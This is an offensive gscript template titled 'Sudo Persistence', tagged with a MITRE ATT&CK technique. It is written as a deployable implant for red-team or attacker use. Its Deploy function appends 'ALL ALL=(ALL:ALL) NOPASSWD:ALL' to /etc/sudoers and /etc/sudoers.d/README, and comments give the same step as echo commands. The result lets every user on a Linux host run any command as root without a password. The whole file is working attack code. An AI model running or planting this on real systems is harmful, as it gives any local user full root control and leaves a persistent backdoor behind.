// Example gscript template
// Title: Sudo Persistence
// Author: ahhh
// Purpose: adds everyone to the sudo group so they can easily priv esc
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1169

//priority:100
//timeout:150

function BeforeDeploy() {
  LogInfo("starting execution of Sudo Persistence");
  // need to make sure we are running as root
  return true; 
}

function Deploy() {  
  // setting ALL to be able to sudo on every command 
  //  echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
  //  echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers.d/README

  var sudo_bytes = StringToByteArray("ALL ALL=(ALL:ALL) NOPASSWD:ALL");
  var obj = AppendFileBytes("/etc/sudoers", sudo_bytes);
  LogInfo(obj.fileError);
  var obj2 = AppendFileBytes("/etc/sudoers.d/README", sudo_bytes);
  LogInfo(obj2.fileError);
  LogInfo("Set ALL to be able to sudo on every command ");

  return true;
}

function AfterDeploy() {
  LogInfo("done Sudo Persistence");
  return true;
}